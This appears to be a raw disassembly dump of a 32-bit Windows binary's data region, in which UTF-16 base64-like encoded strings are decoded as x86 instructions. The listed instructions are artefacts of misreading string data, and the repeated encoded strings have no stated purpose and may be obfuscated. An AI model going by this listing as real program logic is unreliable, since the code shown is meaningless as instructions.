100046e4:	59                   	pop    %ecx
100046e5:	00 63 00             	add    %ah,0x0(%ebx)
100046e8:	44                   	inc    %esp
100046e9:	00 68 00             	add    %ch,0x0(%eax)
100046ec:	53                   	push   %ebx
100046ed:	00 62 00             	add    %ah,0x0(%edx)
100046f0:	54                   	push   %esp
100046f1:	00 42 00             	add    %al,0x0(%edx)
100046f4:	43                   	inc    %ebx
100046f5:	00 61 00             	add    %ah,0x0(%ecx)
100046f8:	32 00                	xor    (%eax),%al
100046fa:	4e                   	dec    %esi
100046fb:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
100046ff:	00 48 00             	add    %cl,0x0(%eax)
10004702:	41                   	inc    %ecx
10004703:	00 34 00             	add    %dh,(%eax,%eax,1)
10004706:	55                   	push   %ebp
10004707:	00 6d 00             	add    %ch,0x0(%ebp)
1000470a:	30 00                	xor    %al,(%eax)
1000470c:	77 00                	ja     0x1000470e
1000470e:	4e                   	dec    %esi
1000470f:	00 55 00             	add    %dl,0x0(%ebp)
10004712:	39 00                	cmp    %eax,(%eax)
10004714:	53                   	push   %ebx
10004715:	00 51 00             	add    %dl,0x0(%ecx)
10004718:	6d                   	insl   (%dx),%es:(%edi)
10004719:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
1000471d:	00 5a 00             	add    %bl,0x0(%edx)
10004720:	56                   	push   %esi
10004721:	00 68 00             	add    %ch,0x0(%eax)
10004724:	77 00                	ja     0x10004726
10004726:	4f                   	dec    %edi
10004727:	00 46 00             	add    %al,0x0(%esi)
1000472a:	4a                   	dec    %edx
1000472b:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
1000472f:	00 45 00             	add    %al,0x0(%ebp)
10004732:	4a                   	dec    %edx
10004733:	00 72 00             	add    %dh,0x0(%edx)
10004736:	59                   	pop    %ecx
10004737:	00 32                	add    %dh,(%edx)
10004739:	00 56 00             	add    %dl,0x0(%esi)
1000473c:	59                   	pop    %ecx
1000473d:	00 63 00             	add    %ah,0x0(%ebx)
10004740:	44                   	inc    %esp
10004741:	00 68 00             	add    %ch,0x0(%eax)
10004744:	53                   	push   %ebx
10004745:	00 62 00             	add    %ah,0x0(%edx)
10004748:	54                   	push   %esp
10004749:	00 42 00             	add    %al,0x0(%edx)
1000474c:	57                   	push   %edi
1000474d:	00 55 00             	add    %dl,0x0(%ebp)
10004750:	6d                   	insl   (%dx),%es:(%edi)
10004751:	00 4e 00             	add    %cl,0x0(%esi)
10004754:	43                   	inc    %ebx
10004755:	00 61 00             	add    %ah,0x0(%ecx)
10004758:	32 00                	xor    (%eax),%al
1000475a:	4e                   	dec    %esi
1000475b:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
1000475f:	00 48 00             	add    %cl,0x0(%eax)
10004762:	41                   	inc    %ecx
10004763:	00 34 00             	add    %dh,(%eax,%eax,1)
10004766:	55                   	push   %ebp
10004767:	00 6d 00             	add    %ch,0x0(%ebp)
1000476a:	30 00                	xor    %al,(%eax)
1000476c:	77 00                	ja     0x1000476e
1000476e:	51                   	push   %ecx
1000476f:	00 6d 00             	add    %ch,0x0(%ebp)
10004772:	74 00                	je     0x10004774
10004774:	6a 00                	push   $0x0
10004776:	5a                   	pop    %edx
10004777:	00 56 00             	add    %dl,0x0(%esi)
1000477a:	68 00 77 00 4f       	push   $0x4f007700
1000477f:	00 46 00             	add    %al,0x0(%esi)
10004782:	4a                   	dec    %edx
10004783:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
10004787:	00 46 00             	add    %al,0x0(%esi)
1000478a:	68 00 46 00 57       	push   $0x57004600
1000478f:	00 6b 00             	add    %ch,0x0(%ebx)
10004792:	4a                   	dec    %edx
10004793:	00 72 00             	add    %dh,0x0(%edx)
10004796:	59                   	pop    %ecx
10004797:	00 32                	add    %dh,(%edx)
10004799:	00 56 00             	add    %dl,0x0(%esi)
1000479c:	59                   	pop    %ecx
1000479d:	00 63 00             	add    %ah,0x0(%ebx)
100047a0:	44                   	inc    %esp
100047a1:	00 68 00             	add    %ch,0x0(%eax)
100047a4:	53                   	push   %ebx
100047a5:	00 62 00             	add    %ah,0x0(%edx)
100047a8:	54                   	push   %esp
100047a9:	00 42 00             	add    %al,0x0(%edx)
100047ac:	43                   	inc    %ebx
100047ad:	00 61 00             	add    %ah,0x0(%ecx)
100047b0:	32 00                	xor    (%eax),%al
100047b2:	4e                   	dec    %esi
100047b3:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
100047b7:	00 48 00             	add    %cl,0x0(%eax)
100047ba:	41                   	inc    %ecx
100047bb:	00 34 00             	add    %dh,(%eax,%eax,1)
100047be:	55                   	push   %ebp
100047bf:	00 6d 00             	add    %ch,0x0(%ebp)
100047c2:	30 00                	xor    %al,(%eax)
100047c4:	77 00                	ja     0x100047c6
100047c6:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
100047ca:	6c                   	insb   (%dx),%es:(%edi)
100047cb:	00 58 00             	add    %bl,0x0(%eax)
100047ce:	51                   	push   %ecx
100047cf:	00 6d 00             	add    %ch,0x0(%ebp)
100047d2:	74 00                	je     0x100047d4
100047d4:	6a 00                	push   $0x0
100047d6:	5a                   	pop    %edx
100047d7:	00 56 00             	add    %dl,0x0(%esi)
100047da:	68 00 77 00 4f       	push   $0x4f007700
100047df:	00 46 00             	add    %al,0x0(%esi)
100047e2:	4a                   	dec    %edx
100047e3:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
100047e7:	00 45 00             	add    %al,0x0(%ebp)
100047ea:	4a                   	dec    %edx
100047eb:	00 72 00             	add    %dh,0x0(%edx)
100047ee:	59                   	pop    %ecx
100047ef:	00 32                	add    %dh,(%edx)
100047f1:	00 56 00             	add    %dl,0x0(%esi)
100047f4:	59                   	pop    %ecx
100047f5:	00 63 00             	add    %ah,0x0(%ebx)
100047f8:	44                   	inc    %esp
100047f9:	00 68 00             	add    %ch,0x0(%eax)
100047fc:	53                   	push   %ebx
100047fd:	00 62 00             	add    %ah,0x0(%edx)
10004800:	54                   	push   %esp
10004801:	00 41 00             	add    %al,0x0(%ecx)
10004804:	78 00                	js     0x10004806
10004806:	62 00                	bound  %eax,(%eax)
10004808:	47                   	inc    %edi
10004809:	00 52 00             	add    %dl,0x0(%edx)
1000480c:	43                   	inc    %ebx
1000480d:	00 61 00             	add    %ah,0x0(%ecx)
10004810:	32 00                	xor    (%eax),%al
10004812:	4e                   	dec    %esi
10004813:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
10004817:	00 48 00             	add    %cl,0x0(%eax)
1000481a:	41                   	inc    %ecx
1000481b:	00 34 00             	add    %dh,(%eax,%eax,1)
1000481e:	55                   	push   %ebp
1000481f:	00 6d 00             	add    %ch,0x0(%ebp)
10004822:	30 00                	xor    %al,(%eax)
10004824:	77 00                	ja     0x10004826
10004826:	51                   	push   %ecx
10004827:	00 6d 00             	add    %ch,0x0(%ebp)
1000482a:	74 00                	je     0x1000482c
1000482c:	6a 00                	push   $0x0
1000482e:	5a                   	pop    %edx
1000482f:	00 56 00             	add    %dl,0x0(%esi)
10004832:	68 00 77 00 4f       	push   $0x4f007700
10004837:	00 46 00             	add    %al,0x0(%esi)
1000483a:	4a                   	dec    %edx
1000483b:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
1000483f:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
10004843:	00 35 00 65 00 55    	add    %dh,0x55006500
10004849:	00 4a 00             	add    %cl,0x0(%edx)
1000484c:	72 00                	jb     0x1000484e
1000484e:	59                   	pop    %ecx
1000484f:	00 32                	add    %dh,(%edx)
10004851:	00 56 00             	add    %dl,0x0(%esi)
10004854:	59                   	pop    %ecx
10004855:	00 63 00             	add    %ah,0x0(%ebx)
10004858:	44                   	inc    %esp
10004859:	00 68 00             	add    %ch,0x0(%eax)
1000485c:	53                   	push   %ebx
1000485d:	00 62 00             	add    %ah,0x0(%edx)
10004860:	54                   	push   %esp
10004861:	00 42 00             	add    %al,0x0(%edx)
10004864:	43                   	inc    %ebx
10004865:	00 61 00             	add    %ah,0x0(%ecx)
10004868:	32 00                	xor    (%eax),%al
1000486a:	4e                   	dec    %esi
1000486b:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
1000486f:	00 48 00             	add    %cl,0x0(%eax)
10004872:	41                   	inc    %ecx
10004873:	00 34 00             	add    %dh,(%eax,%eax,1)
10004876:	55                   	push   %ebp
10004877:	00 6d 00             	add    %ch,0x0(%ebp)
1000487a:	30 00                	xor    %al,(%eax)
1000487c:	77 00                	ja     0x1000487e
1000487e:	59                   	pop    %ecx
1000487f:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10004883:	00 34 00             	add    %dh,(%eax,%eax,1)
10004886:	51                   	push   %ecx
10004887:	00 6d 00             	add    %ch,0x0(%ebp)
1000488a:	74 00                	je     0x1000488c
1000488c:	6a 00                	push   $0x0
1000488e:	5a                   	pop    %edx
1000488f:	00 56 00             	add    %dl,0x0(%esi)
10004892:	68 00 77 00 4f       	push   $0x4f007700
10004897:	00 46 00             	add    %al,0x0(%esi)
1000489a:	4a                   	dec    %edx
1000489b:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
1000489f:	00 45 00             	add    %al,0x0(%ebp)
100048a2:	4a                   	dec    %edx
100048a3:	00 72 00             	add    %dh,0x0(%edx)
100048a6:	59                   	pop    %ecx
100048a7:	00 32                	add    %dh,(%edx)
100048a9:	00 56 00             	add    %dl,0x0(%esi)
100048ac:	59                   	pop    %ecx
100048ad:	00 63 00             	add    %ah,0x0(%ebx)
100048b0:	44                   	inc    %esp
100048b1:	00 68 00             	add    %ch,0x0(%eax)
100048b4:	53                   	push   %ebx
100048b5:	00 62 00             	add    %ah,0x0(%edx)
100048b8:	54                   	push   %esp
100048b9:	00 42 00             	add    %al,0x0(%edx)
100048bc:	6a 00                	push   $0x0
100048be:	5a                   	pop    %edx
100048bf:	00 47 00             	add    %al,0x0(%edi)
100048c2:	70 00                	jo     0x100048c4
100048c4:	43                   	inc    %ebx
100048c5:	00 61 00             	add    %ah,0x0(%ecx)
100048c8:	32 00                	xor    (%eax),%al
100048ca:	4e                   	dec    %esi
100048cb:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
100048cf:	00 48 00             	add    %cl,0x0(%eax)
100048d2:	41                   	inc    %ecx
100048d3:	00 34 00             	add    %dh,(%eax,%eax,1)
100048d6:	55                   	push   %ebp
100048d7:	00 6d 00             	add    %ch,0x0(%ebp)
100048da:	30 00                	xor    %al,(%eax)
100048dc:	77 00                	ja     0x100048de
100048de:	51                   	push   %ecx
100048df:	00 6d 00             	add    %ch,0x0(%ebp)
100048e2:	74 00                	je     0x100048e4
100048e4:	6a 00                	push   $0x0
100048e6:	5a                   	pop    %edx
100048e7:	00 56 00             	add    %dl,0x0(%esi)
100048ea:	68 00 77 00 4f       	push   $0x4f007700
100048ef:	00 46 00             	add    %al,0x0(%esi)
100048f2:	4a                   	dec    %edx
100048f3:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
100048f7:	00 46 00             	add    %al,0x0(%esi)
100048fa:	46                   	inc    %esi
100048fb:	00 31                	add    %dh,(%ecx)
100048fd:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004901:	00 4a 00             	add    %cl,0x0(%edx)
10004904:	72 00                	jb     0x10004906
10004906:	59                   	pop    %ecx
10004907:	00 32                	add    %dh,(%edx)
10004909:	00 56 00             	add    %dl,0x0(%esi)
1000490c:	59                   	pop    %ecx
1000490d:	00 63 00             	add    %ah,0x0(%ebx)
10004910:	44                   	inc    %esp
10004911:	00 68 00             	add    %ch,0x0(%eax)
10004914:	53                   	push   %ebx
10004915:	00 62 00             	add    %ah,0x0(%edx)
10004918:	54                   	push   %esp
10004919:	00 42 00             	add    %al,0x0(%edx)
1000491c:	43                   	inc    %ebx
1000491d:	00 61 00             	add    %ah,0x0(%ecx)
10004920:	32 00                	xor    (%eax),%al
10004922:	4e                   	dec    %esi
10004923:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
10004927:	00 48 00             	add    %cl,0x0(%eax)
1000492a:	41                   	inc    %ecx
1000492b:	00 34 00             	add    %dh,(%eax,%eax,1)
1000492e:	55                   	push   %ebp
1000492f:	00 6d 00             	add    %ch,0x0(%ebp)
10004932:	30 00                	xor    %al,(%eax)
10004934:	77 00                	ja     0x10004936
10004936:	51                   	push   %ecx
10004937:	00 7a 00             	add    %bh,0x0(%edx)
1000493a:	52                   	push   %edx
1000493b:	00 36                	add    %dh,(%esi)
1000493d:	00 51 00             	add    %dl,0x0(%ecx)
10004940:	6d                   	insl   (%dx),%es:(%edi)
10004941:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
10004945:	00 5a 00             	add    %bl,0x0(%edx)
10004948:	56                   	push   %esi
10004949:	00 68 00             	add    %ch,0x0(%eax)
1000494c:	77 00                	ja     0x1000494e
1000494e:	4f                   	dec    %edi
1000494f:	00 46 00             	add    %al,0x0(%esi)
10004952:	4a                   	dec    %edx
10004953:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
10004957:	00 45 00             	add    %al,0x0(%ebp)
1000495a:	4a                   	dec    %edx
1000495b:	00 72 00             	add    %dh,0x0(%edx)
1000495e:	59                   	pop    %ecx
1000495f:	00 32                	add    %dh,(%edx)
10004961:	00 56 00             	add    %dl,0x0(%esi)
10004964:	59                   	pop    %ecx
10004965:	00 63 00             	add    %ah,0x0(%ebx)
10004968:	44                   	inc    %esp
10004969:	00 68 00             	add    %ch,0x0(%eax)
1000496c:	53                   	push   %ebx
1000496d:	00 62 00             	add    %ah,0x0(%edx)
10004970:	54                   	push   %esp
10004971:	00 42 00             	add    %al,0x0(%edx)
10004974:	4e                   	dec    %esi
10004975:	00 52 00             	add    %dl,0x0(%edx)
10004978:	45                   	inc    %ebp
10004979:	00 31                	add    %dh,(%ecx)
1000497b:	00 43 00             	add    %al,0x0(%ebx)
1000497e:	61                   	popa
1000497f:	00 32                	add    %dh,(%edx)
10004981:	00 4e 00             	add    %cl,0x0(%esi)
10004984:	6c                   	insb   (%dx),%es:(%edi)
10004985:	00 57 00             	add    %dl,0x0(%edi)
10004988:	48                   	dec    %eax
10004989:	00 41 00             	add    %al,0x0(%ecx)
1000498c:	34 00                	xor    $0x0,%al
1000498e:	55                   	push   %ebp
1000498f:	00 6d 00             	add    %ch,0x0(%ebp)
10004992:	30 00                	xor    %al,(%eax)
10004994:	77 00                	ja     0x10004996
10004996:	51                   	push   %ecx
10004997:	00 6d 00             	add    %ch,0x0(%ebp)
1000499a:	74 00                	je     0x1000499c
1000499c:	6a 00                	push   $0x0
1000499e:	5a                   	pop    %edx
1000499f:	00 56 00             	add    %dl,0x0(%esi)
100049a2:	68 00 77 00 4f       	push   $0x4f007700
100049a7:	00 46 00             	add    %al,0x0(%esi)
100049aa:	4a                   	dec    %edx
100049ab:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
100049af:	00 48 00             	add    %cl,0x0(%eax)
100049b2:	68 00 50 00 56       	push   $0x56005000
100049b7:	00 6b 00             	add    %ch,0x0(%ebx)
100049ba:	4a                   	dec    %edx
100049bb:	00 72 00             	add    %dh,0x0(%edx)
100049be:	59                   	pop    %ecx
100049bf:	00 32                	add    %dh,(%edx)
100049c1:	00 56 00             	add    %dl,0x0(%esi)
100049c4:	59                   	pop    %ecx
100049c5:	00 63 00             	add    %ah,0x0(%ebx)
100049c8:	44                   	inc    %esp
100049c9:	00 68 00             	add    %ch,0x0(%eax)
100049cc:	53                   	push   %ebx
100049cd:	00 62 00             	add    %ah,0x0(%edx)
100049d0:	54                   	push   %esp
100049d1:	00 42 00             	add    %al,0x0(%edx)
100049d4:	43                   	inc    %ebx
100049d5:	00 61 00             	add    %ah,0x0(%ecx)
100049d8:	32 00                	xor    (%eax),%al
100049da:	4e                   	dec    %esi
100049db:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
100049df:	00 48 00             	add    %cl,0x0(%eax)
100049e2:	41                   	inc    %ecx
100049e3:	00 34 00             	add    %dh,(%eax,%eax,1)
100049e6:	55                   	push   %ebp
100049e7:	00 6d 00             	add    %ch,0x0(%ebp)
100049ea:	30 00                	xor    %al,(%eax)
100049ec:	77 00                	ja     0x100049ee
100049ee:	65 00 47 00          	add    %al,%gs:0x0(%edi)
100049f2:	4e                   	dec    %esi
100049f3:	00 43 00             	add    %al,0x0(%ebx)
100049f6:	61                   	popa
100049f7:	00 32                	add    %dh,(%edx)
100049f9:	00 4e 00             	add    %cl,0x0(%esi)
100049fc:	6c                   	insb   (%dx),%es:(%edi)
100049fd:	00 57 00             	add    %dl,0x0(%edi)
10004a00:	48                   	dec    %eax
10004a01:	00 41 00             	add    %al,0x0(%ecx)
10004a04:	34 00                	xor    $0x0,%al
10004a06:	55                   	push   %ebp
10004a07:	00 6d 00             	add    %ch,0x0(%ebp)
10004a0a:	30 00                	xor    %al,(%eax)
10004a0c:	77 00                	ja     0x10004a0e
10004a0e:	00 15 42 00 6b 00    	add    %dl,0x6b0042
10004a14:	63 00                	arpl   %eax,(%eax)
10004a16:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
10004a1a:	70 00                	jo     0x10004a1c
10004a1c:	38 00                	cmp    %al,(%eax)
10004a1e:	52                   	push   %edx
10004a1f:	00 6d 00             	add    %ch,0x0(%ebp)
10004a22:	30 00                	xor    %al,(%eax)
10004a24:	00 80 b9 61 00 55    	add    %al,0x550061b9(%eax)
10004a2a:	00 31                	add    %dh,(%ecx)
10004a2c:	00 68 00             	add    %ch,0x0(%eax)
10004a2f:	53                   	push   %ebx
10004a30:	00 58 00             	add    %bl,0x0(%eax)
10004a33:	63 00                	arpl   %eax,(%eax)
10004a35:	78 00                	js     0x10004a37
10004a37:	57                   	push   %edi
10004a38:	00 6a 00             	add    %ch,0x0(%edx)
10004a3b:	46                   	inc    %esi
10004a3c:	00 58 00             	add    %bl,0x0(%eax)
10004a3f:	56                   	push   %esi
10004a40:	00 6b 00             	add    %ch,0x0(%ebx)
10004a43:	74 00                	je     0x10004a45
10004a45:	70 00                	jo     0x10004a47
10004a47:	4e                   	dec    %esi
10004a48:	00 57 00             	add    %dl,0x0(%edi)
10004a4b:	6c                   	insb   (%dx),%es:(%edi)
10004a4c:	00 4e 00             	add    %cl,0x0(%esi)
10004a4f:	59                   	pop    %ecx
10004a50:	00 55 00             	add    %dl,0x0(%ebp)
10004a53:	6c                   	insb   (%dx),%es:(%edi)
10004a54:	00 33                	add    %dh,(%ebx)
10004a56:	00 4d 00             	add    %cl,0x0(%ebp)
10004a59:	56                   	push   %esi
10004a5a:	00 6f 00             	add    %ch,0x0(%edi)
10004a5d:	78 00                	js     0x10004a5f
10004a5f:	56                   	push   %esi
10004a60:	00 31                	add    %dh,(%ecx)
10004a62:	00 5a 00             	add    %bl,0x0(%edx)
10004a65:	70 00                	jo     0x10004a67
10004a67:	54                   	push   %esp
10004a68:	00 57 00             	add    %dl,0x0(%edi)
10004a6b:	46                   	inc    %esi
10004a6c:	00 4a 00             	add    %cl,0x0(%edx)
10004a6f:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
10004a73:	46                   	inc    %esi
10004a74:	00 61 00             	add    %ah,0x0(%ecx)
10004a77:	4d                   	dec    %ebp
10004a78:	00 56 00             	add    %dl,0x0(%esi)
10004a7b:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10004a7f:	62 00                	bound  %eax,(%eax)
10004a81:	47                   	inc    %edi
10004a82:	00 56 00             	add    %dl,0x0(%esi)
10004a85:	48                   	dec    %eax
10004a86:	00 61 00             	add    %ah,0x0(%ecx)
10004a89:	55                   	push   %ebp
10004a8a:	00 31                	add    %dh,(%ecx)
10004a8c:	00 68 00             	add    %ch,0x0(%eax)
10004a8f:	53                   	push   %ebx
10004a90:	00 58 00             	add    %bl,0x0(%eax)
10004a93:	63 00                	arpl   %eax,(%eax)
10004a95:	78 00                	js     0x10004a97
10004a97:	57                   	push   %edi
10004a98:	00 6a 00             	add    %ch,0x0(%edx)
10004a9b:	46                   	inc    %esi
10004a9c:	00 58 00             	add    %bl,0x0(%eax)
10004a9f:	56                   	push   %esi
10004aa0:	00 6d 00             	add    %ch,0x0(%ebp)
10004aa3:	6c                   	insb   (%dx),%es:(%edi)
10004aa4:	00 4e 00             	add    %cl,0x0(%esi)
10004aa7:	59                   	pop    %ecx
10004aa8:	00 55 00             	add    %dl,0x0(%ebp)
10004aab:	6c                   	insb   (%dx),%es:(%edi)
10004aac:	00 33                	add    %dh,(%ebx)
10004aae:	00 4d 00             	add    %cl,0x0(%ebp)
10004ab1:	56                   	push   %esi
10004ab2:	00 6f 00             	add    %ch,0x0(%edi)
10004ab5:	78 00                	js     0x10004ab7
10004ab7:	56                   	push   %esi
10004ab8:	00 31                	add    %dh,(%ecx)
10004aba:	00 5a 00             	add    %bl,0x0(%edx)
10004abd:	56                   	push   %esi
10004abe:	00 50 00             	add    %dl,0x0(%eax)
10004ac1:	57                   	push   %edi
10004ac2:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10004ac6:	00 59 00             	add    %bl,0x0(%ecx)
10004ac9:	55                   	push   %ebp
10004aca:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
10004ace:	00 4d 00             	add    %cl,0x0(%ebp)
10004ad1:	56                   	push   %esi
10004ad2:	00 6f 00             	add    %ch,0x0(%edi)
10004ad5:	78 00                	js     0x10004ad7
10004ad7:	56                   	push   %esi
10004ad8:	00 31                	add    %dh,(%ecx)
10004ada:	00 59 00             	add    %bl,0x0(%ecx)
10004add:	3d 00 00 15 69       	cmp    $0x69150000,%eax
10004ae2:	00 4d 00             	add    %cl,0x0(%ebp)
10004ae5:	61                   	popa
10004ae6:	00 49 00             	add    %cl,0x0(%ecx)
10004ae9:	77 00                	ja     0x10004aeb
10004aeb:	31 00                	xor    %eax,(%eax)
10004aed:	5a                   	pop    %edx
10004aee:	00 31                	add    %dh,(%ecx)
10004af0:	00 57 00             	add    %dl,0x0(%edi)
10004af3:	56                   	push   %esi
10004af4:	00 00                	add    %al,(%eax)
10004af6:	81 f1 5a 00 31 00    	xor    $0x31005a,%ecx
10004afc:	68 00 73 00 55       	push   $0x55007300
10004b01:	00 55 00             	add    %dl,0x0(%ebp)
10004b04:	68 00 73 00 62       	push   $0x62007300
10004b09:	00 57 00             	add    %dl,0x0(%edi)
10004b0c:	6c                   	insb   (%dx),%es:(%edi)
10004b0d:	00 71 00             	add    %dh,0x0(%ecx)
10004b10:	56                   	push   %esi
10004b11:	00 46 00             	add    %al,0x0(%esi)
10004b14:	46                   	inc    %esi
10004b15:	00 36                	add    %dh,(%esi)
10004b17:	00 63 00             	add    %ah,0x0(%ebx)
10004b1a:	47                   	inc    %edi
10004b1b:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
10004b1f:	00 62 00             	add    %ah,0x0(%edx)
10004b22:	46                   	inc    %esi
10004b23:	00 46 00             	add    %al,0x0(%esi)
10004b26:	49                   	dec    %ecx
10004b27:	00 62 00             	add    %ah,0x0(%edx)
10004b2a:	47                   	inc    %edi
10004b2b:	00 31                	add    %dh,(%ecx)
10004b2d:	00 70 00             	add    %dh,0x0(%eax)
10004b30:	61                   	popa
10004b31:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10004b35:	00 6e 00             	add    %ch,0x0(%esi)
10004b38:	57                   	push   %edi
10004b39:	00 47 00             	add    %al,0x0(%edi)
10004b3c:	78 00                	js     0x10004b3e
10004b3e:	52                   	push   %edx
10004b3f:	00 53 00             	add    %dl,0x0(%ebx)
10004b42:	47                   	inc    %edi
10004b43:	00 78 00             	add    %bh,0x0(%eax)
10004b46:	74 00                	je     0x10004b48
10004b48:	61                   	popa
10004b49:	00 57 00             	add    %dl,0x0(%edi)
10004b4c:	70 00                	jo     0x10004b4e
10004b4e:	55                   	push   %ebp
10004b4f:	00 59 00             	add    %bl,0x0(%ecx)
10004b52:	31 00                	xor    %eax,(%eax)
10004b54:	68 00 47 00 5a       	push   $0x5a004700
10004b59:	00 31                	add    %dh,(%ecx)
10004b5b:	00 68 00             	add    %ch,0x0(%eax)
10004b5e:	73 00                	jae    0x10004b60
10004b60:	55                   	push   %ebp
10004b61:	00 55 00             	add    %dl,0x0(%ebp)
10004b64:	68 00 73 00 62       	push   $0x62007300
10004b69:	00 57 00             	add    %dl,0x0(%edi)
10004b6c:	6c                   	insb   (%dx),%es:(%edi)
10004b6d:	00 71 00             	add    %dh,0x0(%ecx)
10004b70:	56                   	push   %esi
10004b71:	00 47 00             	add    %al,0x0(%edi)
10004b74:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
10004b78:	62 00                	bound  %eax,(%eax)
10004b7a:	46                   	inc    %esi
10004b7b:	00 46 00             	add    %al,0x0(%esi)
10004b7e:	49                   	dec    %ecx
10004b7f:	00 62 00             	add    %ah,0x0(%edx)
10004b82:	47                   	inc    %edi
10004b83:	00 31                	add    %dh,(%ecx)
10004b85:	00 70 00             	add    %dh,0x0(%eax)
10004b88:	61                   	popa
10004b89:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10004b8d:	00 43 00             	add    %al,0x0(%ebx)
10004b90:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10004b94:	4a                   	dec    %edx
10004b95:	00 6e 00             	add    %ch,0x0(%esi)
10004b98:	57                   	push   %edi
10004b99:	00 47 00             	add    %al,0x0(%edi)
10004b9c:	78 00                	js     0x10004b9e
10004b9e:	52                   	push   %edx
10004b9f:	00 53 00             	add    %dl,0x0(%ebx)
10004ba2:	47                   	inc    %edi
10004ba3:	00 78 00             	add    %bh,0x0(%eax)
10004ba6:	74 00                	je     0x10004ba8
10004ba8:	61                   	popa
10004ba9:	00 57 00             	add    %dl,0x0(%edi)
10004bac:	70 00                	jo     0x10004bae
10004bae:	55                   	push   %ebp
10004baf:	00 5a 00             	add    %bl,0x0(%edx)
10004bb2:	31 00                	xor    %eax,(%eax)
10004bb4:	68 00 73 00 55       	push   $0x55007300
10004bb9:	00 55 00             	add    %dl,0x0(%ebp)
10004bbc:	68 00 73 00 62       	push   $0x62007300
10004bc1:	00 57 00             	add    %dl,0x0(%edi)
10004bc4:	6c                   	insb   (%dx),%es:(%edi)
10004bc5:	00 71 00             	add    %dh,0x0(%ecx)
10004bc8:	56                   	push   %esi
10004bc9:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
10004bcd:	00 6b 00             	add    %ch,0x0(%ebx)
10004bd0:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10004bd4:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
10004bd8:	62 00                	bound  %eax,(%eax)
10004bda:	46                   	inc    %esi
10004bdb:	00 46 00             	add    %al,0x0(%esi)
10004bde:	49                   	dec    %ecx
10004bdf:	00 62 00             	add    %ah,0x0(%edx)
10004be2:	47                   	inc    %edi
10004be3:	00 31                	add    %dh,(%ecx)
10004be5:	00 70 00             	add    %dh,0x0(%eax)
10004be8:	61                   	popa
10004be9:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10004bed:	00 6e 00             	add    %ch,0x0(%esi)
10004bf0:	57                   	push   %edi
10004bf1:	00 47 00             	add    %al,0x0(%edi)
10004bf4:	78 00                	js     0x10004bf6
10004bf6:	52                   	push   %edx
10004bf7:	00 53 00             	add    %dl,0x0(%ebx)
10004bfa:	47                   	inc    %edi
10004bfb:	00 78 00             	add    %bh,0x0(%eax)
10004bfe:	74 00                	je     0x10004c00
10004c00:	61                   	popa
10004c01:	00 57 00             	add    %dl,0x0(%edi)
10004c04:	70 00                	jo     0x10004c06
10004c06:	55                   	push   %ebp
10004c07:	00 57 00             	add    %dl,0x0(%edi)
10004c0a:	56                   	push   %esi
10004c0b:	00 63 00             	add    %ah,0x0(%ebx)
10004c0e:	78 00                	js     0x10004c10
10004c10:	5a                   	pop    %edx
10004c11:	00 31                	add    %dh,(%ecx)
10004c13:	00 68 00             	add    %ch,0x0(%eax)
10004c16:	73 00                	jae    0x10004c18
10004c18:	55                   	push   %ebp
10004c19:	00 55 00             	add    %dl,0x0(%ebp)
10004c1c:	68 00 73 00 62       	push   $0x62007300
10004c21:	00 57 00             	add    %dl,0x0(%edi)
10004c24:	6c                   	insb   (%dx),%es:(%edi)
10004c25:	00 71 00             	add    %dh,0x0(%ecx)
10004c28:	56                   	push   %esi
10004c29:	00 47 00             	add    %al,0x0(%edi)
10004c2c:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
10004c30:	62 00                	bound  %eax,(%eax)
10004c32:	46                   	inc    %esi
10004c33:	00 46 00             	add    %al,0x0(%esi)
10004c36:	49                   	dec    %ecx
10004c37:	00 62 00             	add    %ah,0x0(%edx)
10004c3a:	47                   	inc    %edi
10004c3b:	00 31                	add    %dh,(%ecx)
10004c3d:	00 70 00             	add    %dh,0x0(%eax)
10004c40:	61                   	popa
10004c41:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10004c45:	00 46 00             	add    %al,0x0(%esi)
10004c48:	57                   	push   %edi
10004c49:	00 56 00             	add    %dl,0x0(%esi)
10004c4c:	68 00 6e 00 57       	push   $0x57006e00
10004c51:	00 47 00             	add    %al,0x0(%edi)
10004c54:	78 00                	js     0x10004c56
10004c56:	52                   	push   %edx
10004c57:	00 53 00             	add    %dl,0x0(%ebx)
10004c5a:	47                   	inc    %edi
10004c5b:	00 78 00             	add    %bh,0x0(%eax)
10004c5e:	74 00                	je     0x10004c60
10004c60:	61                   	popa
10004c61:	00 57 00             	add    %dl,0x0(%edi)
10004c64:	70 00                	jo     0x10004c66
